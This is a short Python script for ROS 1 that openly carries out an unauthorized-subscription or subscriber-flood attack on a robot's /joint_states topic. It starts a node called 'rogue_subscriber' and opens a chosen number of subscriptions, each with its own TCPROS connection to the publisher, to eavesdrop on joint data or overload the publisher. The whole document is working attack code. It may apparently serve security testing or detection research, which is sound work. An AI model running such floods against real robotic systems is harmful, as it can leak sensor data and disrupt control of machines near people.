#!/usr/bin/env python3
"""Unauthorized subscribe (N=1) or subscriber flood (N>1): rogue subscriptions to /joint_states.
In ROS 1 every subscription opens its own TCPROS connection to the publisher."""
import sys, rospy
from sensor_msgs.msg import JointState
n = int(sys.argv[1]) if len(sys.argv) > 1 else 1
rospy.init_node("rogue_subscriber", anonymous=True)
subs = [rospy.Subscriber("/joint_states", JointState, lambda m: None, queue_size=1) for _ in range(n)]
rospy.spin()
